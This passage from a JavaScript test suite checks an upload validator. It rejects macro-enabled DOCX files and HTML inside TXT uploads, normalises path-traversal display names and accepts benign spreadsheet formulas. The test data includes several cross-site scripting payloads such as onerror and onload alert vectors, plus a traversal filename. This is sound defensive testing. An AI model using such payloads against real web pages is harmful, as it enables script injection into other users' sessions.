      declaredMime: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
      declaredSize: bytes.length,
      bytes,
    })).rejects.toThrow();
  });

  it('rejects macro-enabled content types even without a vba filename', async () => {
    const bytes = createZip([
      { name: '[Content_Types].xml', data: Buffer.from('<Types><Override ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/></Types>') },
      { name: '_rels/.rels', data: Buffer.from('<Relationships/>') },
      { name: 'word/document.xml', data: Buffer.from('<w:document/>') },
    ]);
    await expect(validateFile({
      name: 'guide.docx', declaredMime: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', declaredSize: bytes.length, bytes,
    })).rejects.toThrow();
  });

  it('returns normalized metadata for TXT and never derives object keys from a display name', async () => {
    const rawName = '..\\bad/\u202e e\u0301.txt\r\n';
    const result = await validateFile({ name: rawName, declaredMime: 'text/plain', declaredSize: txt.length, bytes: txt });
    expect(result).toEqual({
      name: 'bad é.txt',
      extension: 'txt',
      mimeType: 'text/plain',
      size: txt.length,
      sha256: createHash('sha256').update(txt).digest('hex'),
      bytes: txt,
    });
    const key = createRandomObjectKey('33333333-3333-4333-8333-333333333333', 'quarantine', () => '11111111-1111-4111-8111-111111111111');
    expect(key).toBe('11111111-1111-4111-8111-111111111111');
    expect(key).not.toContain('bad');
    expect(key).not.toMatch(/quarantine|ready|33333333/iu);
  });

  it('accepts legitimate comparison prose during complete TXT validation', async () => {
    const comparison = Buffer.from('Диапазон: 2 < 3 и 5 > 4.\n', 'utf8');
    await expect(validateFile({
      name: 'notes.txt', declaredMime: 'text/plain', declaredSize: comparison.length, bytes: comparison,
    })).resolves.toMatchObject({ bytes: comparison, mimeType: 'text/plain' });
  });

  it('accepts benign XLSX formulas, structured references, and defined names', async () => {
    const bytes = xlsx([], {
      sheet: Buffer.from('<worksheet><sheetData><row><c><f>SUM(Table1[Amount])</f></c></row></sheetData></worksheet>'),
      workbook: Buffer.from('<workbook><definedNames><definedName name="TaxRate">Sheet1!$A$1</definedName></definedNames></workbook>'),
    });
    await expect(validateFile({
      name: 'stock.xlsx',
      declaredMime: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
      declaredSize: bytes.length,
      bytes,
    })).resolves.toMatchObject({ extension: 'xlsx', bytes });
  });

  it('accepts legitimate comparison prose during TXT preflight', () => {
    const headerBytes = Buffer.from('Диапазон: 2 < 3 и 5 > 4.\n', 'utf8');
    expect(() => validateUpload({
      name: 'notes.txt', declaredMime: 'text/plain', size: headerBytes.length, headerBytes,
    })).not.toThrow();
  });

  it('rejects an HTML fragment anywhere in the TXT preflight window', () => {
    const headerBytes = Buffer.from('Обычный текст перед фрагментом.\n<strong>HTML</strong>\n', 'utf8');
    expect(() => validateUpload({
      name: 'notes.txt', declaredMime: 'text/plain', size: headerBytes.length, headerBytes,
    })).toThrow(/HTML/iu);
  });

  it.each([
    '<!-- hidden -->',
    '<!doctype html>',
    '<?xml version="1.0"?>',
    '<strong>HTML</strong>',
    '<svg/onload=alert(1)>',
    '<img/src=x onerror=alert(1)>',
    '<details/open/ontoggle=alert(1)>',
    '<img\nsrc=x\nonerror=alert(1)>',
  ])('rejects slash-separated markup syntax during TXT preflight: %s', (markup) => {
    const headerBytes = Buffer.from(`Обычный текст.\n${markup}\n`, 'utf8');
    expect(() => validateUpload({
      name: 'notes.txt', declaredMime: 'text/plain', size: headerBytes.length, headerBytes,
    })).toThrow(/HTML/iu);
  });

  it('treats header validation as preflight only and rejects a declared-size mismatch at completion', async () => {
    expect(validateUpload({ name: 'notes.txt', declaredMime: 'text/plain', size: txt.length, headerBytes: txt.subarray(0, 16) }))
      .toMatchObject({ name: 'notes.txt', extension: 'txt', declaredMime: 'text/plain', size: txt.length });
    await expect(validateFile({ name: 'notes.txt', declaredMime: 'text/plain', declaredSize: txt.length + 1, bytes: txt }))
      .rejects.toThrow(/размер/iu);
  });
});
